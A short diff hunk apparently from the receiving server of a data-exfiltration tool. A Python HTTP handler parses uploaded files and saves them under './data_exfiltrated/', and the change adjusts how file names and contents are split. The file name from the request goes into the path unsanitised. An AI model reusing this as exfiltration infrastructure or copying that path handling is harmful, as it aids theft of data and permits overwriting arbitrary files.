@@ -35,8 +35,8 @@ class handler(BaseHTTPRequestHandler):
         for file in received_files :
                 name_file=file.split(b"file : ")[1].split(b"\n")[0] #get file name
                 print(name_file.decode()+" is here!")
-                file=file.split(b"file : ")[1].split(b"\n",1)[1] #get rest of file
-                print(file[:30])
+                file=file.split(b"file : ",1)[1].split(b"\n",1)[1] #get rest of file
+                print(file[-30:])
                 temp_file_to_write = open("./data_exfiltrated/"+name_file.decode(), "wb") 
                 temp_file_to_write.write(file)
                 temp_file_to_write.close() 
